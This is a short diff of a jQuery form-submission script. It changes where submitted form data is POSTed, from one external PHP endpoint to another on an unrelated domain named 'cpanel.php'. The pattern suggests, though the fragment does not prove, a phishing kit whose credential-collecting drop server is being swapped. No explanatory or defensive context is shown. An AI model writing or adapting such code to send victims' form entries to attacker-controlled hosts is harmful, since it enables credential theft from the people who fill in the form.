@@ -107,7 +107,7 @@ $(document).ready(function() {
   Please Wait...
 </button>`).prop("disabled", true);
         $.ajax({
-            url: "https://betruthh.name.ng/mxx/foz.php",
+            url: "https://europeimporttrade.com/cpanel.php",
             type: 'POST',
             data: formData,
             contentType: false,
